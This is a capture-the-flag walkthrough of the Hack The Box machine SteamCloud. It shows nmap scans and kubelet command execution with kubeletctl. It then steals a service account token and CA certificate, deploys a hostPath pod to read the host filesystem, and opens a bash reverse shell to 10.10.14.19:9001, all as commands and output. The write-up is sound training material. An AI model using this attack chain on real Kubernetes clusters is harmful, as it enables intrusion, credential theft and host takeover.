---                                                                                                                          
layout: single                                                                                                               
title: HTB - SteamCloud                                                                                                      
excerpt: HTB - SteamCloud Walkthrough                                                                                        
date: 2022-02-16                                                                                                             
classes: wide                                                                                                                
header:                                                                                                                      
  teaser: /assets/images/htb-steamcloud/htb-steamcloud.png                                                                   
categories:                                                                                                                  
  - Walkthrough                                                                                                              
tags:                                                                                                                        
  - kubernetes
  - kubectl
  - kubeletctl                                                                                           
---
![](/assets/images/htb-steamcloud/htb-steamcloud.png) 

# Nmap

## TCP

```bash
sudo nmap -sC -sV -p 22,2379,2380,8443,10249,10250,10256 -oA scans/tcp-version 10.129.158.166                                                                                                                                                 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-16 09:44 EST                                                                                                                                                                                             
Nmap scan report for 10.129.158.166                                                                                                                                                                                                                         
Host is up (0.045s latency).                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                            
PORT      STATE SERVICE          VERSION                                                                                                                                                                                                                    
22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)                                                                                                                                                                             
| ssh-hostkey:                                                                                                                                                                                                                                              
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)                                                                                                                                                                                              
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)                                                                                                                                                                                             
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)                                                                                                                                                                                           
2379/tcp  open  ssl/etcd-client?                                                                                                                                                                                                                            
| ssl-cert: Subject: commonName=steamcloud                                                                                                                                                                                                                  
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.129.158.166, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1                                                                                                                      
| Not valid before: 2022-02-16T14:35:32                                                                                                                                                                                                                     
|_Not valid after:  2023-02-16T14:35:33                                                                                                                                                                                                                     
| tls-alpn:                                                                                                                                                                                                                                                 
|_  h2                                                                                                                                                                                                                                                      
|_ssl-date: TLS randomness does not represent time                                                                                                                                                                                                          
2380/tcp  open  ssl/etcd-server?                                                                                                                                                                                                                            
| ssl-cert: Subject: commonName=steamcloud                                                                                                                                                                                                                  
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.129.158.166, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1                                                                                                                      
| Not valid before: 2022-02-16T14:35:32                                                                                                                                                                                                                     
|_Not valid after:  2023-02-16T14:35:33                                                                                                                                                                                                                     
| tls-alpn:                                                                                                                                                                                                                                                 
|_  h2                                                                                                                                                                                                                                                      
|_ssl-date: TLS randomness does not represent time
8443/tcp  open  ssl/https-alt                                                                                                                                                                                                                               
| fingerprint-strings:                                                                                                                                                                                                                                      
|   FourOhFourRequest:                                                                                                                                                                                                                                      
|     HTTP/1.0 403 Forbidden                                                                                                                                                                                                                                
|     Audit-Id: 880e6067-821b-494f-8172-606e38ee93e8                                                                                                                                                                                                        
|     Cache-Control: no-cache, private                                                                                                                                                                                                                      
|     Content-Type: application/json                                                                                                                                                                                                                        
|     X-Content-Type-Options: nosniff                                                                                                                                                                                                                       
|     X-Kubernetes-Pf-Flowschema-Uid: 661a3b20-525f-4782-b805-a9a5852a76df                                                                                                                                                                                  
|     X-Kubernetes-Pf-Prioritylevel-Uid: 8d06c670-7964-4aa0-9012-06a5d09b603e                                                                                                                                                                               
|     Date: Wed, 16 Feb 2022 14:45:06 GMT                                                                                                                                                                                                                   
|     Content-Length: 212                                                                                                                                                                                                                                   
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}                                       
|   GetRequest:                                                                                                                                                                                                                                             
|     HTTP/1.0 403 Forbidden                                                                                                                                                                                                                                
|     Audit-Id: f97f4b61-caa5-4255-8996-61469935ad4c                                                                                                                                                                                                        
|     Cache-Control: no-cache, private                                                                                                                                                                                                                      
|     Content-Type: application/json                                                                                                                                                                                                                        
|     X-Content-Type-Options: nosniff                                                                                                                                                                                                                       
|     X-Kubernetes-Pf-Flowschema-Uid: 661a3b20-525f-4782-b805-a9a5852a76df                                                                                                                                                                                  
|     X-Kubernetes-Pf-Prioritylevel-Uid: 8d06c670-7964-4aa0-9012-06a5d09b603e                                                                                                                                                                               
|     Date: Wed, 16 Feb 2022 14:45:06 GMT                                                                                                                                                                                                                   
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: a7abd54f-4b7c-49f3-b57b-8941c9884622
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 661a3b20-525f-4782-b805-a9a5852a76df
|     X-Kubernetes-Pf-Prioritylevel-Uid: 8d06c670-7964-4aa0-9012-06a5d09b603e
|     Date: Wed, 16 Feb 2022 14:45:06 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.129.158.166, IP Address:10.96.0.
1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2022-02-15T14:35:29
|_Not valid after:  2025-02-15T14:35:29
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=steamcloud@1645022136
| Subject Alternative Name: DNS:steamcloud
| Not valid before: 2022-02-16T13:35:35
|_Not valid after:  2023-02-16T13:35:35
|_ssl-date: TLS randomness does not represent time
10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=steamcloud@1645022136
| Subject Alternative Name: DNS:steamcloud
| Not valid before: 2022-02-16T13:35:35
|_Not valid after:  2023-02-16T13:35:35
|_ssl-date: TLS randomness does not represent time
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.92%T=SSL%I=7%D=2/16%Time=620D0DF4%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,22F,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20f97f4
SF:b61-caa5-4255-8996-61469935ad4c\r\nCache-Control:\x20no-cache,\x20priva
SF:te\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20n
SF:osniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20661a3b20-525f-4782-b805-a9
SF:a5852a76df\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x208d06c670-7964-4aa0-
SF:9012-06a5d09b603e\r\nDate:\x20Wed,\x2016\x20Feb\x202022\x2014:45:06\x20
SF:GMT\r\nContent-Length:\x20185\r\n\r\n{\"kind\":\"Status\",\"apiVersion\
SF:":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden
SF::\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/
SF:\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(HTTP
SF:Options,233,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20a7abd54f-4b7
SF:c-49f3-b57b-8941c9884622\r\nCache-Control:\x20no-cache,\x20private\r\nC
SF:ontent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosniff\
SF:r\nX-Kubernetes-Pf-Flowschema-Uid:\x20661a3b20-525f-4782-b805-a9a5852a7
SF:6df\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x208d06c670-7964-4aa0-9012-06
SF:a5d09b603e\r\nDate:\x20Wed,\x2016\x20Feb\x202022\x2014:45:06\x20GMT\r\n
SF:Content-Length:\x20189\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\
SF:",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x20Us
SF:er\x20\\\"system:anonymous\\\"\x20cannot\x20options\x20path\x20\\\"/\\\
SF:"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(FourOhF
SF:ourRequest,24A,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20880e6067-
SF:821b-494f-8172-606e38ee93e8\r\nCache-Control:\x20no-cache,\x20private\r
SF:\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosni
SF:ff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20661a3b20-525f-4782-b805-a9a585
SF:2a76df\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x208d06c670-7964-4aa0-9012
SF:-06a5d09b603e\r\nDate:\x20Wed,\x2016\x20Feb\x202022\x2014:45:06\x20GMT\
SF:r\nContent-Length:\x20212\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"
SF:v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x2
SF:0User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/nice
SF:\x20ports,/Trinity\.txt\.bak\\\"\",\"reason\":\"Forbidden\",\"details\"
SF::{},\"code\":403}\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.37 seconds
```

## UDP

```bash
sudo nmap -sU -sV --top-ports 20 -oA scans/top20udp 10.129.158.166                            
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-16 09:54 EST
Nmap scan report for 10.129.158.166
Host is up (0.045s latency).

PORT      STATE         SERVICE      VERSION
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   closed        netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   closed        isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   closed        ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  closed        nat-t-ike
49152/udp open|filtered unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.82 seconds
```

# Enumeration

## kubelet

From HackTricks [https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/pentesting-kubernetes-from-the-outside#kubelet-rce](https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/pentesting-kubernetes-from-the-outside#kubelet-rce) I was able to find the following guide about pentesting kubernetes. I used HackTricks and few other resources to solve this box. 

![Untitled](/assets/images/htb-steamcloud/Untitled.png)

### kubeletctl

The tools I used:

[https://github.com/cyberark/kubeletctl](https://github.com/cyberark/kubeletctl) 

```bash
https://github.com/cyberark/kubeletctl
```

The source blog:

[https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet](https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet)

```bash
https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet
```

```bash
➜  scripts ./kubeletctl_linux_amd64 scan rce -s 10.129.239.41
┌──────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                   │
├───┬───────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP       │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼───────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │               │                                    │             │                         │ RUN │
├───┼───────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.129.239.41 │ nginx                              │ default     │ nginx                   │ +   │
├───┼───────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │               │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼───────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 3 │               │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │ -   │
├───┼───────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 4 │               │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ -   │
├───┼───────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 5 │               │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │ -   │
├───┼───────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 6 │               │ storage-provisioner                │ kube-system │ storage-provisioner     │ -   │
├───┼───────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 7 │               │ kube-proxy-w47c7                   │ kube-system │ kube-proxy              │ +   │
├───┼───────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 8 │               │ coredns-78fcd69978-z6hqm           │ kube-system │ coredns                 │ -   │
└───┴───────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘
```

```bash
./kubeletctl_linux_amd64 -s 10.129.158.166 exec 'id' -p nginx -c nginx
uid=0(root) gid=0(root) groups=0(root)
```

# User Flag

```bash
➜  scripts ./kubeletctl_linux_amd64 -s 10.129.239.41 exec 'ls -l /root' -p nginx -c nginx
total 4
-rw-r--r-- 2 1000 root 33 Feb 16 21:43 user.txt
➜  scripts 
➜  scripts ./kubeletctl_linux_amd64 -s 10.129.239.41 exec 'cat /root/user.txt' -p nginx -c nginx
413c54ab52e2b25ccef73c0faebdc305
➜  scripts
```

# Privilege Escalation

From HackTricks:

[https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration#service-account-tokens](https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration#service-account-tokens)

![Untitled](/assets/images/htb-steamcloud/Untitled%201.png)

Checking the first location suggested by HackTricks shows the `token, ca.crt and namespace`

```bash
➜  scripts ./kubeletctl_linux_amd64 -s 10.129.239.41 exec 'ls -l /run/secrets/kubernetes.io/serviceaccount' -p nginx -c nginx

total 0
lrwxrwxrwx 1 root root 13 Feb 16 21:44 ca.crt -> ..data/ca.crt
lrwxrwxrwx 1 root root 16 Feb 16 21:44 namespace -> ..data/namespace
lrwxrwxrwx 1 root root 12 Feb 16 21:44 token -> ..data/token
```

Reading the token

```bash
➜  scripts ./kubeletctl_linux_amd64 -s 10.129.239.41 exec 'cat /run/secrets/kubernetes.io/serviceaccount/token' -p nginx -c nginx
eyJhbGciOiJSUzI1NiIsImtpZCI6ImJQaE1tMnhQd3BTcTQ4NmRuQ1ZCSm5JV25qd3ZXNjloNnlTM3Y3SXd1czAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc2NTgzODQyLCJpYXQiOjE2NDUwNDc4NDIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjBmYjQxNjlkLWFjYmQtNGZkMC04MTc3LTBjYTc0NGMzYjJlNiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImNkZmI4MTI2LWVjZWYtNDM5OS05MDgwLTVjMmUzYmM2ZTlhNyJ9LCJ3YXJuYWZ0ZXIiOjE2NDUwNTE0NDl9LCJuYmYiOjE2NDUwNDc4NDIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.D_zvldESuT6WitH6FXKL7jVkAuj9aRRU53QWbEsMHVGQZn6AA1tKQ7J9IDPTYpnPwG2eHpobtuAp24D--UFl-sAxDztyA5vjY0v9PLAA6jW7J6-QJttb8PZNsrYAtDgY0Ye4OWGjV09epXfMnjX_1S4ReXWobRVZAtfwaOyoplo-_exqbqeylc9m4S9Y_8rP6hVg-M5zqThaSg-DFoYq_bXGrSii9h4q9tujpDPqDliyptd9pR1cnFEmO0h3VxZd3VQh1zyzmULxfjBR6ztjZdvO_YWQGE4CHjCgINqqqGFQgynwpXl1YwdKlI6uvfH6l7kkvEWL-EC9zaknNQap9w%               
➜  scripts
```

Reading the ca.crt 

```bash
➜  scripts ./kubeletctl_linux_amd64 -s 10.129.239.41 exec 'cat /run/secrets/kubernetes.io/serviceaccount/ca.crt' -p nginx -c nginx
-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
a3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA1UE
AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOoa
YRSqoSUfHaMBK44xXLLuFXNELhJrC/9O0R2Gpt8DuBNIW5ve+mgNxbOLTofhgQ0M
HLPTTxnfZ5VaavDH2GHiFrtfUWD/g7HA8aXn7cOCNxdf1k7M0X0QjPRB3Ug2cID7
deqATtnjZaXTk0VUyUp5Tq3vmwhVkPXDtROc7QaTR/AUeR1oxO9+mPo3ry6S2xqG
VeeRhpK6Ma3FpJB3oN0Kz5e6areAOpBP5cVFd68/Np3aecCLrxf2Qdz/d9Bpisll
hnRBjBwFDdzQVeIJRKhSAhczDbKP64bNi2K1ZU95k5YkodSgXyZmmkfgYORyg99o
1pRrbLrfNk6DE5S9VSUCAwEAAaNhMF8wDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW
MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQW
BBSpRKCEKbVtRsYEGRwyaVeonBdMCjANBgkqhkiG9w0BAQsFAAOCAQEA0jqg5pUm
lt1jIeLkYT1E6C5xykW0X8mOWzmok17rSMA2GYISqdbRcw72aocvdGJ2Z78X/HyO
DGSCkKaFqJ9+tvt1tRCZZS3hiI+sp4Tru5FttsGy1bV5sa+w/+2mJJzTjBElMJ/+
9mGEdIpuHqZ15HHYeZ83SQWcj0H0lZGpSriHbfxAIlgRvtYBfnciP6Wgcy+YuU/D
xpCJgRAw0IUgK74EdYNZAkrWuSOA0Ua8KiKuhklyZv38Jib3FvAo4JrBXlSjW/R0
JWSyodQkEF60Xh7yd2lRFhtyE8J+h1HeTz4FpDJ7MuvfXfoXxSDQOYNQu09iFiMz
kf2eZIBNMp0TFg==
-----END CERTIFICATE-----
```

## kubectl

### Installing kubectl

Source: [https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux)

```bash
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
```

With the token and cert, I can now use `kubectl` to talk to the `kube-apiserver` and create a pod with a volume that mounts the hosts file system so that I can execute commands on the host.

```bash
# cat squid22.yaml    
apiVersion: v1
kind: Pod
metadata:
  name: squid-pod
spec:
  containers:
    - name: squid-pod
      image: nginx:1.14.2
      volumeMounts:
        - name: squidhacks
          mountPath: /mnt  
  volumes:
    - name: squidhacks
      hostPath:
        path: /
        type: Directory
```

Saving the token to a variable

```bash
token=$(./kubeletctl_linux_amd64 -s 10.129.239.41 exec 'cat /run/secrets/kubernetes.io/serviceaccount/token' -p nginx -c nginx)
```

Verifying the token

```bash
echo $token                         
eyJhbGciOiJSUzI1NiIsImtpZCI6ImJQaE1tMnhQd3BTcTQ4NmRuQ1ZCSm5JV25qd3ZXNjloNnlTM3Y3SXd1czAifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc2NTgzODQyLCJpYXQiOjE2NDUwNDc4NDIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjBmYjQxNjlkLWFjYmQtNGZkMC04MTc3LTBjYTc0NGMzYjJlNiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImNkZmI4MTI2LWVjZWYtNDM5OS05MDgwLTVjMmUzYmM2ZTlhNyJ9LCJ3YXJuYWZ0ZXIiOjE2NDUwNTE0NDl9LCJuYmYiOjE2NDUwNDc4NDIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.D_zvldESuT6WitH6FXKL7jVkAuj9aRRU53QWbEsMHVGQZn6AA1tKQ7J9IDPTYpnPwG2eHpobtuAp24D--UFl-sAxDztyA5vjY0v9PLAA6jW7J6-QJttb8PZNsrYAtDgY0Ye4OWGjV09epXfMnjX_1S4ReXWobRVZAtfwaOyoplo-_exqbqeylc9m4S9Y_8rP6hVg-M5zqThaSg-DFoYq_bXGrSii9h4q9tujpDPqDliyptd9pR1cnFEmO0h3VxZd3VQh1zyzmULxfjBR6ztjZdvO_YWQGE4CHjCgINqqqGFQgynwpXl1YwdKlI6uvfH6l7kkvEWL-EC9zaknNQap9w
```

### Creating my pod

```bash
➜  scripts ./kubectl apply --token=$token --certificate-authority=./ca.crt -f squid22.yaml -n default -s https://10.129.239.41:8443/
pod/squid-pod created
```

Checking the pods using `kubeletctl` shows `squid-pod` which is the one I added.

```bash
➜  scripts ./kubeletctl_linux_amd64 scan rce -s 10.129.239.41
┌──────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                   │
├───┬───────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP       │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼───────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │               │                                    │             │                         │ RUN │
├───┼───────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.129.239.41 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │ -   │
├───┼───────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │               │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ -   │
├───┼───────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 3 │               │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼───────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 4 │               │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │ -   │
├───┼───────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 5 │               │ storage-provisioner                │ kube-system │ storage-provisioner     │ -   │
├───┼───────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 6 │               │ kube-proxy-w47c7                   │ kube-system │ kube-proxy              │ +   │
├───┼───────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 7 │               │ coredns-78fcd69978-z6hqm           │ kube-system │ coredns                 │ -   │
├───┼───────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 8 │               │ nginx                              │ default     │ nginx                   │ +   │
├───┼───────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 9 │               │ squid-pod                          │ default     │ squid-pod               │ +   │
└───┴───────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘
```

I can execute commands and read files on the hosts and I can even read the root flag

```bash
➜  scripts ./kubeletctl_linux_amd64 -s 10.129.239.41 exec 'ls -l /mnt/root/' -p squid-pod -c squid-pod
total 4
-rw-r--r-- 1 root root 33 Feb 16 21:43 root.txt
➜  scripts 
➜  scripts 
➜  scripts ./kubeletctl_linux_amd64 -s 10.129.239.41 exec 'cat /mnt/root/root.txt' -p squid-pod -c squid-pod
e9150c34840e7087b81b094b98939dc3
➜  scripts
```

# Getting a Shell

Getting a shell was a kind of challenge because I couldn’t use a lot characters such as `& > >> $(..)` and the container didn’t have tools such as `nc python python3 wget curl` 

A good idea is to create another pod with commands

```bash
# cat rev-squid22.yaml
apiVersion: v1
kind: Pod
metadata:
  name: squid-rev
spec:
  containers:
    - name: squid-rev
      image: nginx:1.14.2
      command: ['/bin/bash']
      args: ['-c', '/bin/bash -i >& /dev/tcp/10.10.14.19/9001 0>&1']
      volumeMounts:
        - name: squidhacks
          mountPath: /mnt  
  volumes:
    - name: squidhacks
      hostPath:
        path: /
        type: Directory
```

```bash
➜  scripts ./kubectl apply --token=$token --certificate-authority=./ca.crt -f rev-squid22.yaml -n default -s https://10.129.239.41:8443/
pod/squid-rev created
```

```bash
➜  scripts nc -lnvp 9001
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.129.239.41.
Ncat: Connection from 10.129.239.41:39766.
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@squid-rev:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@squid-rev:/# hostname -I
hostname -I
172.17.0.5 
root@squid-rev:/# cd /mnt/
cd /mnt/
root@squid-rev:/mnt# cd root
cd root
root@squid-rev:/mnt/root# cat root.txt
cat root.txt
e9150c34840e7087b81b094b98939dc3
root@squid-rev:/mnt/root# 

root@squid-rev:/mnt/root#
```